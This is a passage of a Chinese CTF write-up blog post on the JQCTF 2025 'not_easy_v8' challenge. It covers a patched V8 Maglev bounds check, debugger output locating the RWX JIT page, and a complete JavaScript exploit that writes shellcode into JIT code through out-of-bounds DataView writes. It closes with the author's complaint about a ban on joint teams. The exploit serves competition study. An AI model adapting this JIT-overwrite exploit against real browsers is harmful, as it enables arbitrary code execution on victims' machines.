+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/maglev/x64/maglev-ir-x64.cc b/src/maglev/x64/maglev-ir-x64.cc</span></span><br><span class="line"><span class="comment">index ef1f9937105..4f3bbe6756f 100644</span></span><br><span class="line"><span class="comment">--- a/src/maglev/x64/maglev-ir-x64.cc</span></span><br><span class="line"><span class="comment">+++ b/src/maglev/x64/maglev-ir-x64.cc</span></span><br><span class="line"><span class="meta">@@ -113,7 +113,7 @@</span> void CheckJSDataViewBounds::GenerateCode(MaglevAssembler* masm,</span><br><span class="line">   int element_size = compiler::ExternalArrayElementSize(element_type_);</span><br><span class="line">   if (element_size &gt; 1) &#123;</span><br><span class="line">     __ subq(byte_length, Immediate(element_size - 1));</span><br><span class="line"><span class="deletion">-    __ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);</span></span><br><span class="line"><span class="addition">+//     __ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);</span></span><br><span class="line">   &#125;</span><br><span class="line">   __ cmpl(index, byte_length);</span><br><span class="line">   __ EmitEagerDeoptIf(above_equal, DeoptimizeReason::kOutOfBounds, this);</span><br></pre></td></tr></table></figure>
+
+<p>在 Maglev 优化编译器的 CheckJSDataViewBounds 函数中，移除了对 DataView 越界访问的关键检查逻辑<br>因此我们可以利用这个地方构造出 arraybuffer 上的堆溢出。这里需要注意的是， arraybuffer 的是利用 backing_store 指针去指向他管理的数据，而这个指针是指向系统自身的用户态堆空间而不是 v8 自己所管理的堆。在这道题目中，指向的是 glibc 的堆，也就是说我们构造出的堆溢出是在 glibc 的堆上的，堆溢出的 poc 如下：  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">tryOOBFloat64</span>(<span class="params">index, data</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            smallView.<span class="title function_">setFloat64</span>(index, data, <span class="literal">true</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;win&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="comment">// console.error(&quot;Caught error during optimized execution:&quot;, e.message);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>patch 文件里还定义了另外两个函数，一个是 Jing()， 另外一个是 Qi()。<br>Jing：返回V8引擎代码空间（Code Space）中第一个 RWX 内存页的起始地址<br>Qi：接受一个ArrayBuffer对象，返回其底层数据指针的地址值，也就是 backing_store 指针的值  </p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在 JavaScript 中，当一个函数被反复调用时，v8 为了加快执行速度，会把这个函数变成成 jit 机械码并将其存放在 Code Space 中，这个区域是 RWX 的，既然我们已经能够进行堆上的指定偏移写并知道了 backing_store 指向的地址和 rwx 页的起始地址，那我们可以直接向这个函数对应的 jit 代码区域直接写入 shellcode。jit 相对于 RWX 的偏移的固定的，在 gdb 中可以通过下面的方法获得：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x139500058831</span><br><span class="line">0x139500058831: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x139500043595 &lt;Map[32](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1395000436c1 &lt;JSFunction (sfi = 0x139500041a5d)&gt;</span><br><span class="line"> - elements: 0x1395000007bd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype:</span><br><span class="line"> - initial_map:</span><br><span class="line"> - shared_info: 0x13950005854d &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - name: 0x139500058315 &lt;String[3]: <span class="comment">#foo&gt;</span></span><br><span class="line"> - formal_parameter_count: 1</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x13950005878d &lt;ScriptContext[8]&gt;</span><br><span class="line"> - code: 0x139500080515 &lt;Code MAGLEV&gt;</span><br><span class="line"> - dispatch_handle: 0x131300</span><br><span class="line"> - <span class="built_in">source</span> code: () &#123;</span><br><span class="line">    <span class="built_in">return</span> [</span><br><span class="line">        1.0,</span><br><span class="line">        1.95538254221075331056310651818E-246,</span><br><span class="line">        1.95606125582421466942709801013E-246,</span><br><span class="line">        1.99957147195425773436923756715E-246,</span><br><span class="line">        1.95337673326740932133292175341E-246,</span><br><span class="line">        2.63486047652296056448306022844E-284];</span><br><span class="line">&#125;</span><br><span class="line"> - properties: 0x1395000007bd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x139500000de5: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x139500026901 &lt;AccessorInfo name= 0x139500000de5 &lt;String[6]: #length&gt;, data= 0x139500000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [__C]), location: descriptor</span></span><br><span class="line">    0x139500000dd5: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#name: 0x1395000268e1 &lt;AccessorInfo name= 0x139500000dd5 &lt;String[4]: #name&gt;, data= 0x139500000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [__C]), location: descriptor</span></span><br><span class="line">    0x139500000dbd: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#prototype: 0x139500026921 &lt;AccessorInfo name= 0x139500000dbd &lt;String[9]: #prototype&gt;, data= 0x139500000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - feedback vector: 0x1395000589a1: [FeedbackVector] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x13950000087d &lt;Map(FEEDBACK_VECTOR_TYPE)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line"> - shared <span class="keyword">function</span> info: 0x13950005854d &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - tiering_in_progress: 0</span><br><span class="line"> - osr_tiering_in_progress: 0</span><br><span class="line"> - invocation count: 209277</span><br><span class="line"> - closure feedback cell array: 0x1395000021a5: [ClosureFeedbackCellArray] <span class="keyword">in</span> ReadOnlySpace</span><br><span class="line"> - map: 0x139500000855 &lt;Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - elements:</span><br><span class="line"></span><br><span class="line"> - slot <span class="comment">#0 Literal  &#123;</span></span><br><span class="line">     [0]: 0x139500058a59 &lt;AllocationSite&gt;</span><br><span class="line">  &#125;</span><br><span class="line">pwndbg&gt; tel 0x139500080515-5</span><br><span class="line">00:0000│  0x139500080510 ◂— 0xd8500003b13</span><br><span class="line">01:0008│  0x139500080518 ◂— 0x8001100080479</span><br><span class="line">02:0010│  0x139500080520 ◂— 0xe0000a310005c069</span><br><span class="line">03:0018│  0x139500080528 —▸ 0x5f5de0000a40 ◂— push rbp /* 0x49505756e5894855 */</span><br><span class="line">04:0020│  0x139500080530 ◂— 0x12b00131300</span><br><span class="line">05:0028│  0x139500080538 ◂— 0x2800000150</span><br><span class="line">06:0030│  0x139500080540 ◂— 0xffffffff00000000</span><br><span class="line">07:0038│  0x139500080548 ◂— 0x2800000028 /* <span class="string">&#x27;(&#x27;</span> */</span><br><span class="line">pwndbg&gt; vmmap 0x5f5de0000a40</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x5f5dbc662000     0x5f5dbc73d000 rw-p    db000      0 [heap]</span><br><span class="line">►   0x5f5de0000000     0x5f5e00000000 rwxp 20000000      0 [anon_5f5de0000] +0xa40</span><br><span class="line">    0x705b78000000     0x705b78021000 rw-p    21000      0 [anon_705b78000]</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里比较难受的地方是，我们本地和远程 victim_func 的 jit 与 RWX 起始地址的偏移是不一样的，所以我在 shellcode 前面加了一堆 nop 来提高命中率 :(  </p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终的 exp 如下：  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;log&#125; = <span class="variable language_">console</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hexx</span> = (<span class="params">str, v</span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;[*] &quot;</span> + str + <span class="string">&quot;: 0x&quot;</span> + v.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    -<span class="number">6.828527034422786e-229</span>,</span><br><span class="line">    <span class="number">7.748604185565308e-304</span>,</span><br><span class="line">    <span class="number">7.001521162788231e+194</span>,</span><br><span class="line">    <span class="number">1.7732903756252677e-288</span>,</span><br><span class="line">    -<span class="number">2.192048338075426e+261</span>,</span><br><span class="line">    <span class="number">1.073717152e-313</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> smallBuffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">const</span> smallView = <span class="keyword">new</span> <span class="title class_">DataView</span>(smallBuffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">tryOOBFloat64</span>(<span class="params">index, data</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            smallView.<span class="title function_">setFloat64</span>(index, data, <span class="literal">true</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;win&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="comment">// console.error(&quot;Caught error during optimized execution:&quot;, e.message);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer_addr = <span class="title class_">Qi</span>(smallBuffer);</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;array buffer address&quot;</span>, buffer_addr);</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title class_">Jing</span>() + <span class="number">0x80n</span>;</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;rwx address&quot;</span>, rwx_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> offset = rwx_addr - buffer_addr;</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;offset&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">tryOOBFloat64</span>(<span class="title class_">Number</span>(offset) + <span class="number">8</span>*i, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure>
+
+<p>打远程的截图：  </p>
+<img src="/2025/07/27/not_easy_v8/2.png" class="" title="我的图图呢">  
+
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>对于题目本身并没有什么好说的，这是一道非常 easy 的题目（做不出来的可以去重开了 bushi），但是我对比赛的主办方非常的失望。京东举办这场比赛的目的想必应该是为各个网安的强者们创造一次精彩的比拼的机会并为自己的公司找到适合自己业务的人才，但是我有一点不怎么理解的是为什么要禁止联合战队参加呢？</p>
+<p>也许是考虑到联合战队太过于超模破坏了比赛的平衡？按照我的了解，大部分的联队参加线下比赛输出大部分来自与线下参加的那几个人，而且我也没见到联队和那些顶级校队比优势在哪里，甚至远远比不上，更别说破坏比赛的平衡了。而我们都知道，很多学校的 CTF 氛围其实并不好，有非常多的独苗为了改变现状拼尽全力，但是一个人的力量总是有限的。就以我为例子，今年 ciscn 半决赛我一个人就将 awdp 打到赛区第二名，长城杯决赛也一个人将队伍打到前百分之 40，难道我对队伍的贡献还不够多嘛，是我还不够努力嘛，我个人得分都快全场最高了吧，我有拿到 ciscn 的国一嘛？联队的意义是什么呢？我觉得是一方面将各个学校的强者集合起来去冲击更高的奖项，另一方面是为各个学校很努力、有实力但没有队友的独苗们提供一个能够展现自身实力的平台。但现在限制联队参加的比赛却越来越多，包括这次京麒 CTF，这对于校队独苗来说是极大的不公平且极大的打击他们的自信心，有大量的独苗就这样失望的、无助的没落。这不仅不利于 CTF 界的发展，而且更加不利于我国网络安全的发展。我尊重主方法的各种行为，但是我希望各个比赛的主办方能够改变对联队的看法，以更加开放、包容的态度去看待联队。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/friend/">Link</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">写在最后</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/07/27/not_easy_v8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/07/27/not_easy_v8/&text=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/07/27/not_easy_v8/&is_video=false&description=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp&body=Check out this article: https://qanux.github.io/2025/07/27/not_easy_v8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/07/27/not_easy_v8/&name=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/07/27/not_easy_v8/&t=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    Qanux
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/friend/">Link</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
